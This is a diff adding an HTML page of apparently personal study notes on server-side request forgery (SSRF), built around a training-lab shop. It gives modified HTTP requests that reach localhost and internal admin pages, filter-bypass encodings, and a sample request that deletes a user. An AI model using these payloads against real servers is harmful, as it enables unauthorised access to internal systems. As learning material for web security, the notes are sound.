@@ -1,0 +1,53 @@
+
+<h3>SSRF attacks against the server itself</h3>
+<p> 
+    change requests to point to the server it self and access an admin interface:
+
+    change the following request:
+    
+    POST /product/stock HTTP/1.0
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 118
+
+    stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
+
+
+    to this reqeust:
+    POST /product/stock HTTP/1.0
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 118
+
+    stockApi=http://127.0.0.1/admin
+
+    This will allow you to bypass the admin restrictions in some cases.
+</p>
+
+
+<h3>SSRF attacks against back end server </h3>
+<p> 
+    same as previous attack but now you can use a different local ip address:
+    
+    stockApi=http://192.168.0.68/admin
+</p>
+
+
+
+<h2>Circumventing common SSRF defenses</h2>
+<h3>Bypass blacklist based input filter</h3>
+    <p> 
+        - Using an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1. you can also use hex representation such as 0x7f.0x0.0x0.0x1. or octal encoding: 0177.0.0.01.
+        - Registering your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose.
+        - Obfuscating blocked strings using URL encoding or case variation. use double encoding. 
+    </p>
+
+
+    <h3>Bypass whitelist based input filter</h3>
+    <p> 
+        - use # to indicate url fragmentation. 
+        - use double encoding. and try encoding some charcters and leaving others to confuse the filter system. 
+        - check if server supports embedded credentials by changing parameter to http://username@stock.weliketoshop.net. if you get no error, then this attack works. here is an example:
+            http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
+        -You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: https://expected-host.evil-host
+    </p>
+
+    
